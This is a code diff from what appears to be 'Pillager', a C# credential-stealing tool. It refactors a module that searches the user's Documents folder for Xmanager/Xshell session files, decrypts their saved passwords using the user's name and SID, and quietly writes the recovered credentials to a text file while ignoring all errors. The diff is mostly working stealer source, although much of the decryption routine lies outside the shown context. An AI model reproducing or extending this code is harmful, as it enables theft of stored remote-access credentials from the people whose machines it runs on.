@@ -10,13 +10,11 @@ using Pillager.Helper;
 
 namespace Pillager.Tools
 {
-    internal static class Xmanager
+    internal class Xmanager : ICommand
     {
-        public static string ToolName = "Xmanager";
+        public List<string> sessionFiles = new List<string>();
 
-        public static List<string> sessionFiles = new List<string>();
-
-        public static void GetAllAccessibleFiles(string rootPath)
+        public void GetAllAccessibleFiles(string rootPath)
         {
             DirectoryInfo di = new DirectoryInfo(rootPath);
             var dirs = di.GetDirectories();
@@ -35,7 +33,7 @@ namespace Pillager.Tools
             }
         }
 
-        public static string DecryptSessions()
+        public string DecryptSessions()
         {
             StringBuilder sb = new StringBuilder();
             WindowsIdentity currentUser = WindowsIdentity.GetCurrent();
@@ -60,7 +58,7 @@ namespace Pillager.Tools
             return sb.ToString();
         }
 
-        static List<string> ReadConfigFile(string path)
+        List<string> ReadConfigFile(string path)
         {
             string fileData = File.ReadAllText(path);
             string Version = null;
@@ -91,7 +89,7 @@ namespace Pillager.Tools
             return resultString;
         }
 
-        static string Decrypt(string username, string sid, string rawPass, string ver)
+        string Decrypt(string username, string sid, string rawPass, string ver)
         {
             if (ver.StartsWith("5.0") || ver.StartsWith("4") || ver.StartsWith("3") || ver.StartsWith("2"))
             {
@@ -154,16 +152,16 @@ namespace Pillager.Tools
             return "";
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 GetAllAccessibleFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
                 if (sessionFiles.Count == 0) return;
-                string savepath = Path.Combine(path, ToolName);
+                string savepath = Path.Combine(path, "Xmanager");
                 Directory.CreateDirectory(savepath);
                 string output = DecryptSessions();
-                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, ToolName + ".txt"), output);
+                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, "Xmanager.txt"), output, Encoding.UTF8);
             }
             catch { }
         }
